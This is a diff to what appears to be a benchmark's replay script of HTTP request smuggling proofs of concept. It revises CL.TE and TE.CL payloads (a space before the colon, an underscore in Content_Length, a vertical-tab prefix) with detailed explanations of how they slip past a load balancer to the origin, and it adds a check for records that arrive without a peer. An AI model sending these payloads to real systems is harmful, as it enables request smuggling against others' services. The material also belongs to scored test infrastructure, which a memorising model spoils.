@@ -172,8 +172,17 @@ def poc_0001() -> None:
 
 
 def poc_0004() -> None:
-    """CL.TE, coding value prefixed with a vertical tab (0x0b)."""
-    _cl_te("/api/cart/items", b"Transfer-Encoding: \x0bchunked\r\n")
+    """CL.TE, coding value prefixed with a vertical tab (0x0b).
+
+    The coding header's name carries a space before the colon. The balancer reads the
+    name as "Transfer-Encoding " and so does not recognise a coding header at all, which
+    is what leaves it framing by Content-Length; the origin's reader trims the name and
+    then has to strip the vertical tab off the value before it matches "chunked", which
+    is the observation the counter attributes on. Sending the same value under the plain
+    name is answered 400 by the balancer, which rejects any coding it does not know
+    before the message can reach anything.
+    """
+    _cl_te("/api/cart/items", b"Transfer-Encoding : \x0bchunked\r\n")
 
 
 def _te_cl(method: str, target: str, coding_headers: bytes) -> None:
@@ -182,6 +191,14 @@ def _te_cl(method: str, target: str, coding_headers: bytes) -> None:
     Content-Length is exactly the length of the chunk-size line, so the origin consumes
     "<hex>CRLF" and nothing more; the chunk data — a complete request — is what it reads
     next, while the front is still forwarding what it considers one body.
+
+    The length header is spelled with an underscore. Once the balancer has decided a
+    message is chunked it deletes every header literally named Content-Length before
+    forwarding, which would leave the origin with no framing at all and a request line
+    it cannot parse — the boundary would still have moved, but the connection would drop
+    instead of a request emerging from the gap. The underscore spelling is opaque to the
+    balancer and is folded back to "-" by the origin's reader, so the length survives the
+    hop that framed by chunked. Same disagreement, same two tests, one spelling.
     """
     stray = stray_request()
     size_line = b"%x\r\n" % len(stray)
@@ -189,7 +206,7 @@ def _te_cl(method: str, target: str, coding_headers: bytes) -> None:
     head = (
         f"{method} {target} HTTP/1.1\r\nHost: {VHOST}\r\n".encode()
         + b"Content-Type: application/x-www-form-urlencoded\r\n"
-        + b"Content-Length: %d\r\n" % len(size_line)
+        + b"Content_Length: %d\r\n" % len(size_line)
         + coding_headers
         + b"\r\n"
     )
@@ -197,9 +214,16 @@ def _te_cl(method: str, target: str, coding_headers: bytes) -> None:
 
 
 def poc_0002() -> None:
-    """TE.CL, two coding headers; the origin honours the last."""
+    """TE.CL, two coding headers; the origin honours the last.
+
+    The second name carries a space before the colon: the balancer reads it as a
+    different header, keeps framing on the first (chunked) one and forwards both, while
+    the origin trims the name and honours "cow" as the last coding. Spelling the second
+    one plainly is answered 400 — the balancer rejects a message carrying two coding
+    headers outright.
+    """
     _te_cl("POST", "/account/preferences",
-           b"Transfer-Encoding: chunked\r\nTransfer-Encoding: cow\r\n")
+           b"Transfer-Encoding: chunked\r\nTransfer-Encoding : cow\r\n")
 
 
 def poc_0005() -> None:
@@ -380,12 +404,19 @@ def main() -> int:
 
     counts: dict[str, int] = {}
     details: dict[str, str] = {}
+    peerless: dict[str, int] = {}
     for ev in events:
         rec = ev.get("payload", ev) if isinstance(ev.get("payload"), dict) else ev
         sig = rec.get("signal")
         if not sig:
             continue
         counts[sig] = counts.get(sig, 0) + 1
+        # A sink that hands its work to a raw thread pool loses the request context, and
+        # its record then arrives with no peer at all — indistinguishable from a genuine
+        # background job, so nothing downstream can tell this replay apart from a tool's
+        # own exploitation. Assert it here rather than discover it in a scored run.
+        if not (rec.get("peer_ip") or rec.get("source_ip")) or rec.get("peer_missing"):
+            peerless[sig] = peerless.get(sig, 0) + 1
         attrs = rec.get("attributes") or rec.get("evidence") or {}
         if attrs.get("detail") and sig not in details:
             details[sig] = attrs["detail"]
@@ -395,10 +426,13 @@ def main() -> int:
     for vuln_id, _ in POCS:
         sig = signals[vuln_id]
         n = counts.get(sig, 0)
-        print(f"{'ok  ' if n == 1 else 'FAIL'} {vuln_id}  {sig}  count={n}")
+        no_peer = peerless.get(sig, 0)
+        ok = n == 1 and no_peer == 0
+        suffix = "" if not no_peer else f"  no-peer={no_peer}"
+        print(f"{'ok  ' if ok else 'FAIL'} {vuln_id}  {sig}  count={n}{suffix}")
         if sig in details:
             print(f"       {details[sig][:300]}")
-        if n != 1:
+        if not ok:
             failures.append(vuln_id)
 
     for sig in sorted(set(counts) - set(by_signal)):
@@ -407,11 +441,13 @@ def main() -> int:
 
     print()
     if failures:
-        print(f"{len(failures)} of {len(POCS)} entries did not fire exactly once")
+        print(f"{len(failures)} of {len(POCS)} entries did not fire exactly once with a peer")
         print("count 0: the chain repaired the behaviour (check the pinned versions), or "
               "the PoC no longer matches what the origin's reader does.")
         print("count >1: something is counting the payload rather than the effect, which "
               "would hand tools free points.")
+        print("no-peer: the record arrived with no socket peer, so nothing downstream can "
+              "tell this replay from a tool's own exploitation.")
         return 1
 
     print(f"all {len(POCS)} edge counters fired exactly once")
